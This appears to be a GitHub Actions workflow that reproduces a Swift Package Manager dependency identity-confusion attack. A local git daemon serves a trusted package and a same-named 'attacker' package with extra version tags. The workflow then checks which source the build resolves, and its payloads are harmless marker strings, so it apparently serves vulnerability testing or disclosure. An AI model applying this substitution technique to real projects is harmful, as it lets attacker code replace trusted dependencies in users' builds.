name: CI
on: [push]

jobs:
  git-005:
    name: Dependency resolution
    runs-on: ubuntu-latest
    steps:
      - uses: swift-actions/setup-swift@v2
        with:
          swift-version: '6.0'
      - name: Test resolution
        run: |
          set -e
          WORK=$(mktemp -d)
          git config --global user.name "CI" && git config --global user.email "ci@test"
          
          mkdir -p $WORK/repos/trusted $WORK/repos/attacker
          
          # Trusted "shared" package
          mkdir -p $WORK/trusted-work/Sources/TrustedLib
          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/trusted-work/Package.swift
          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/trusted-work/Sources/TrustedLib/Lib.swift
          git -C $WORK/trusted-work init -q -b main && git -C $WORK/trusted-work add -A && git -C $WORK/trusted-work commit -qm init && git -C $WORK/trusted-work tag 1.0.0
          git clone -q --bare $WORK/trusted-work $WORK/repos/trusted/shared.git
          touch $WORK/repos/trusted/shared.git/git-daemon-export-ok
          
          # Attacker "shared" package (same basename, more version tags)
          mkdir -p $WORK/attacker-work/Sources/TrustedLib
          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/attacker-work/Package.swift
          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/attacker-work/Sources/TrustedLib/Lib.swift
          git -C $WORK/attacker-work init -q -b main && git -C $WORK/attacker-work add -A && git -C $WORK/attacker-work commit -qm init
          for v in 1.0.0 1.0.1 1.0.2 1.0.3 1.0.4; do git -C $WORK/attacker-work tag $v; done
          git clone -q --bare $WORK/attacker-work $WORK/repos/attacker/shared.git
          touch $WORK/repos/attacker/shared.git/git-daemon-export-ok
          
          # Start git daemon
          git daemon --reuseaddr --base-path=$WORK/repos --export-all --enable=receive-pack --port=9418 &
          DAEMON_PID=$!
          sleep 1
          
          # Carrier package (introduces attacker's shared via git://)
          mkdir -p $WORK/carrier-work/Sources/CarrierLib
          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"git://127.0.0.1/attacker/shared.git",from:"1.0.0")],targets:[.target(name:"CarrierLib")])\n' > $WORK/carrier-work/Package.swift
          echo 'public enum CarrierLib {}' > $WORK/carrier-work/Sources/CarrierLib/Lib.swift
          git -C $WORK/carrier-work init -q -b main && git -C $WORK/carrier-work add -A && git -C $WORK/carrier-work commit -qm init && git -C $WORK/carrier-work tag 1.0.0
          git clone -q --bare $WORK/carrier-work $WORK/repos/carrier.git
          touch $WORK/repos/carrier.git/git-daemon-export-ok
          
          # Root package: depends on trusted shared + carrier
          mkdir -p $WORK/root/Sources/App
          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"root",dependencies:[.package(url:"git://127.0.0.1/trusted/shared.git",from:"1.0.0"),.package(url:"git://127.0.0.1/carrier.git",from:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"TrustedLib",package:"shared"),.product(name:"CarrierLib",package:"carrier")])])\n' > $WORK/root/Package.swift
          echo 'import TrustedLib; print(sharedValue)' > $WORK/root/Sources/App/main.swift
          
          echo "=== Root manifest ==="
          cat $WORK/root/Package.swift
          
          echo "=== Building ==="
          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -15
          
          echo "=== Runtime ==="
          OUTPUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
          echo "output=$OUTPUT"
          
          echo "=== Checkout source ==="
          cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift 2>/dev/null || echo "checkout not found"
          
          echo "=== RESULT ==="
          if echo "$OUTPUT" | grep -q "ATTACKER-HIJACKED"; then
            echo "VULNERABLE: Attacker source replaced trusted via identity confusion"
          elif echo "$OUTPUT" | grep -q "TRUSTED-LEGITIMATE"; then
            echo "NOT VULNERABLE: Trusted source was used"
          else
            echo "UNKNOWN: output=$OUTPUT"
          fi
          
          kill $DAEMON_PID 2>/dev/null
